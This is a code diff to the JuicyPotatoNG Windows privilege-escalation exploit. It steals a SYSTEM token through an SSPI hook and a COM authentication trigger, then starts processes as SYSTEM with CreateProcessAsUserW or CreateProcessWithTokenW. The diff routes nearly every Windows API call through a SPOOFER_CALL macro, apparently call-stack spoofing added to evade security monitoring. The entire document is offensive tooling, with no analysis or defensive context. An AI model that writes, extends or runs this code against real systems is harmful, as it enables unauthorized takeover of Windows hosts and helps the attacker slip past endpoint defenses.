@@ -1,4 +1,6 @@
-﻿#include "Windows.h"
+﻿#include "Header.h"
+
+#include "Windows.h"
 #include "stdio.h"
 #include "strsafe.h"
 #include "netfw.h"
@@ -120,21 +122,30 @@ int wmain(int argc, wchar_t** argv)
 	}
 
 	if (!testingClsid) 
+	{
 		printf("[*] Testing CLSID %S - COM server port %S \n", clsidStr, comPort);
-	g_hEventAuthTriggered = CreateEventW(NULL, TRUE, FALSE, NULL);
-	g_hEventTokenStolen = CreateEventW(NULL, TRUE, FALSE, NULL);
+	}
+
+	g_hEventAuthTriggered = SPOOFER_CALL(CreateEventW)(NULL, TRUE, FALSE, NULL);
+	g_hEventTokenStolen = SPOOFER_CALL(CreateEventW)(NULL, TRUE, FALSE, NULL);
 	g_SystemTokenStolen = FALSE;
+
 	HookSSPIForTokenStealing(clsidStr);
 	ImpersonateInteractiveSid();
 	PotatoTrigger(clsidStr, comPort, g_hEventAuthTriggered);
-	RevertToSelf();
+	SPOOFER_CALL(RevertToSelf)();
 	
+	if(g_hEventAuthTriggered == 0 || g_hEventTokenStolen == 0) {
+		printf("[-] Failed to create necessary events, exiting... \n");
+		return -1;
+	}
+
 	if (!testingClsid) {
-		if (WaitForSingleObject(g_hEventAuthTriggered, 3000) == WAIT_TIMEOUT) {
+		if (SPOOFER_CALL(WaitForSingleObject)(g_hEventAuthTriggered, 3000) == WAIT_TIMEOUT) {
 			printf("[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag. \n");
 		}
 		else {
-			if (WaitForSingleObject(g_hEventTokenStolen, 3000) == WAIT_TIMEOUT && g_SystemTokenStolen) {
+			if (SPOOFER_CALL(WaitForSingleObject)(g_hEventTokenStolen, 3000) == WAIT_TIMEOUT && g_SystemTokenStolen) {
 				printf("[-] Cannot capture a valid SYSTEM token, exiting... \n");
 			}
 			else {
@@ -146,24 +157,25 @@ int wmain(int argc, wchar_t** argv)
 		}
 	}
 	else {
-		WaitForSingleObject(g_hEventAuthTriggered, 500);
-		WaitForSingleObject(g_hEventTokenStolen, 500);
+		SPOOFER_CALL(WaitForSingleObject)(g_hEventAuthTriggered, 500);
+		SPOOFER_CALL(WaitForSingleObject)(g_hEventTokenStolen, 500);
 	}
 	
-	CloseHandle(g_hEventAuthTriggered);
-	CloseHandle(g_hEventTokenStolen);
-	CloseHandle(g_hTokenStolenPrimary);
-	CloseHandle(g_hTokenStolenSecondary);
+	SPOOFER_CALL(CloseHandle)(g_hEventAuthTriggered);
+	SPOOFER_CALL(CloseHandle)(g_hEventTokenStolen);
+	SPOOFER_CALL(CloseHandle)(g_hTokenStolenPrimary);
+	SPOOFER_CALL(CloseHandle)(g_hTokenStolenSecondary);
 	return 0;
 }
 
 void ImpersonateInteractiveSid() {
 	HANDLE hToken;
-	if (!LogonUserW(L"JuicyPotatoNG", L".", L"JuicyPotatoNG", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken)) {
+	if (!SPOOFER_CALL(LogonUserW)(L"JuicyPotatoNG", L".", L"JuicyPotatoNG", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken)) {
 		printf("[!] LogonUser failed with error code %d \n", GetLastError());
 		exit(-1);
 	}
-	ImpersonateLoggedOnUser(hToken);
+	BOOL isImpersonating = FALSE;
+	isImpersonating = SPOOFER_CALL(ImpersonateLoggedOnUser)(hToken);
 }
 
 BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
@@ -172,7 +184,7 @@ BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
 	LUID luid;
 	PRIVILEGE_SET privs;
 	BOOL privEnabled;
-	if (!LookupPrivilegeValueW(NULL, priv, &luid))
+	if (!SPOOFER_CALL(LookupPrivilegeValueW)(NULL, priv, &luid))
 	{
 		printf("LookupPrivilegeValue() failed, error %u\n", GetLastError());
 		return FALSE;
@@ -180,7 +192,7 @@ BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
 	tp.PrivilegeCount = 1;
 	tp.Privileges[0].Luid = luid;
 	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
+	if (!SPOOFER_CALL(AdjustTokenPrivileges)(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
 	{
 		printf("AdjustTokenPrivileges() failed, error %u\n", GetLastError());
 		return FALSE;
@@ -189,7 +201,7 @@ BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
 	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
 	privs.Privilege[0].Luid = luid;
 	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
-	if (!PrivilegeCheck(hToken, &privs, &privEnabled)) {
+	if (!SPOOFER_CALL(PrivilegeCheck)(hToken, &privs, &privEnabled)) {
 		printf("PrivilegeCheck() failed, error %u\n", GetLastError());
 		return FALSE;
 	}
@@ -212,52 +224,66 @@ int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interac
 
 	// This exploit works when you have either SeImpersonate or SeAssignPrimaryToken privileges
 	// We perform some token adjustments to succeed in both cases
-	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrProc);
+	SPOOFER_CALL(OpenProcessToken)(SPOOFER_CALL(GetCurrentProcess)(), TOKEN_ALL_ACCESS, &hTokenCurrProc);
+
 	if (EnablePriv(hTokenCurrProc, SE_IMPERSONATE_NAME)) {
 		EnablePriv(g_hTokenStolenSecondary, SE_IMPERSONATE_NAME);
 		EnablePriv(g_hTokenStolenSecondary, SE_ASSIGNPRIMARYTOKEN_NAME);
 		EnablePriv(g_hTokenStolenSecondary, SE_TCB_NAME);
-		ImpersonateLoggedOnUser(g_hTokenStolenSecondary);
+		isImpersonating = SPOOFER_CALL(ImpersonateLoggedOnUser)(g_hTokenStolenSecondary);
 		isImpersonating = TRUE;
 	}
-	else {
-		if (!EnablePriv(hTokenCurrProc, SE_ASSIGNPRIMARYTOKEN_NAME)) {
-			printf("[!] Current process doesn't have SeImpersonate or SeAssignPrimaryToken privileges, exiting... \n");
-			exit(-1);
-		}
+	else if (!EnablePriv(hTokenCurrProc, SE_ASSIGNPRIMARYTOKEN_NAME)) {
+		printf("[!] Current process doesn't have SeImpersonate or SeAssignPrimaryToken privileges, exiting... \n");
+		exit(-1);
 	}
-	CloseHandle(hTokenCurrProc);
+
+	SPOOFER_CALL(CloseHandle)(hTokenCurrProc);
 
 	if (cmdline != NULL)
 	{
-		command = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxCmdlineLen * sizeof(WCHAR));
-		StringCchCopyW(command, maxCmdlineLen, appname);
-		StringCchCatW(command, maxCmdlineLen, L" ");
-		StringCchCatW(command, maxCmdlineLen, cmdline);
+		command = (wchar_t*)SPOOFER_CALL(HeapAlloc)(SPOOFER_CALL(GetProcessHeap)(), HEAP_ZERO_MEMORY, maxCmdlineLen * sizeof(WCHAR));
+
+		if (command)
+		{
+			StringCchCopyW(command, maxCmdlineLen, appname);
+			StringCchCatW(command, maxCmdlineLen, L" ");
+			StringCchCatW(command, maxCmdlineLen, cmdline);
+		}
 	}
 
 	if (*processtype == L'u' || *processtype == L'*')
 	{
-		memset(&si, 0, sizeof(STARTUPINFO));
 		memset(&pi, 0, sizeof(PROCESS_INFORMATION));
+		memset(&si, 0, sizeof(STARTUPINFO));
 		si.cb = sizeof(STARTUPINFO);
 		si.lpDesktop = desktopName;
+
 		dwCreationFlags = interactiveMode ? 0 : CREATE_NEW_CONSOLE;
-		if (!interactiveMode) {
-			ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
-			SetTokenInformation(g_hTokenStolenPrimary, TokenSessionId, &sessionId, sizeof(sessionId));
+		
+		if (!interactiveMode) 
+		{
+			SPOOFER_CALL(ProcessIdToSessionId)(SPOOFER_CALL(GetCurrentProcessId)(), &sessionId);
+			SPOOFER_CALL(SetTokenInformation)(g_hTokenStolenPrimary, TokenSessionId, &sessionId, sizeof(sessionId));
 		}
-		result = CreateProcessAsUserW(g_hTokenStolenPrimary, appname, command, NULL, NULL, FALSE, dwCreationFlags, NULL, L"\\", &si, &pi);
+		
+		result = SPOOFER_CALL(CreateProcessAsUserW)(g_hTokenStolenPrimary, appname, command, NULL, NULL, FALSE, dwCreationFlags, NULL, L"\\", &si, &pi);
+		
 		if (!result)
 			printf("[-] CreateProcessAsUser Failed to create proc: %d\n", GetLastError());
-		else {
+		else 
+		{
 			printf("[+] CreateProcessAsUser OK\n");
-			if (interactiveMode) {
+
+			if (interactiveMode) 
+			{
 				printf("[*] Process output:\n");
-				WaitForSingleObject(pi.hProcess, INFINITE);
+				SPOOFER_CALL(WaitForSingleObject)(pi.hProcess, INFINITE);
 			}
-			CloseHandle(pi.hThread);
-			CloseHandle(pi.hProcess);
+
+			SPOOFER_CALL(CloseHandle)(pi.hThread);
+			SPOOFER_CALL(CloseHandle)(pi.hProcess);
+
 			ret = 1;
 			goto cleanup;
 		}
@@ -270,9 +296,12 @@ int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interac
 		si.cb = sizeof(STARTUPINFO);
 		si.lpDesktop = desktopName;
 		
-		result = CreateProcessWithTokenW(g_hTokenStolenPrimary, 0, appname, command, 0, NULL, NULL, &si, &pi);
+		result = SPOOFER_CALL(CreateProcessWithTokenW)(g_hTokenStolenPrimary, 0, appname, command, 0, NULL, NULL, &si, &pi);
+
 		if (!result)
+		{
 			printf("[-] CreateProcessWithTokenW Failed to create proc: %d\n", GetLastError());
+		}
 		else
 		{
 			printf("[+] CreateProcessWithTokenW OK\n");
@@ -282,8 +311,16 @@ int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interac
 	}
 
 cleanup:
-	if (isImpersonating) RevertToSelf();
-	if (command != NULL) HeapFree(GetProcessHeap, 0, command);
+	if (isImpersonating)
+	{
+		SPOOFER_CALL(RevertToSelf)();
+	}
+
+	if (command != NULL)
+	{
+		SPOOFER_CALL(HeapFree)(SPOOFER_CALL(GetProcessHeap)(), 0, command);
+	}
+
 	fflush(stdout);
 	return ret;
 }
@@ -295,27 +332,34 @@ void SeekNonFilteredPorts() {
 	VARIANT allowed, restricted;
 	VARIANT_BOOL firewallEnabled;
 	printf("[*] Finding suitable port not filtered by Windows Defender Firewall to be used in our local COM Server port.\n");
-	CoInitialize(NULL);
-	CoCreateInstance(CLSID_NetFwMgr, NULL, CLSCTX_INPROC_SERVER, IID_INetFwMgr, (LPVOID*)&pNetFwMgr);
+	HRESULT nop = SPOOFER_CALL(CoInitialize)(NULL);
+	nop = SPOOFER_CALL(CoCreateInstance)(CLSID_NetFwMgr, NULL, CLSCTX_INPROC_SERVER, IID_INetFwMgr, (LPVOID*)&pNetFwMgr);
 	pNetFwMgr->get_LocalPolicy(&pNetFwPolicy);
 	pNetFwPolicy->get_CurrentProfile(&pNetFwProfile);
 	pNetFwProfile->get_FirewallEnabled(&firewallEnabled);
-	if (!firewallEnabled) {
+
+	if (!firewallEnabled) 
+	{
 		printf("[*] Windows Defender Firewall not enabled. Every COM port will work.\n");
 	}
 	else {
-		for (LONG portNumber = 20; portNumber < 65535; portNumber++) {
+		for (LONG portNumber = 20; portNumber < 65535; portNumber++) 
+		{
 			pNetFwMgr->IsPortAllowed((BSTR)L"System", NET_FW_IP_VERSION_ANY, portNumber, (BSTR)L"", NET_FW_IP_PROTOCOL_TCP, &allowed, &restricted);
-			if (allowed.boolVal) {
+
+			if (allowed.boolVal) 
+			{
 				printf("[+] Found non filtered port: %d \n", portNumber);
 			}
 		}
 	}
+
 	pNetFwProfile->Release();
 	pNetFwPolicy->Release();
 	pNetFwMgr->Release();
 	pNetFwMgr->Release();
-	CoUninitialize();
+
+	SPOOFER_CALL(CoUninitialize)();
 }
 
 void usage()
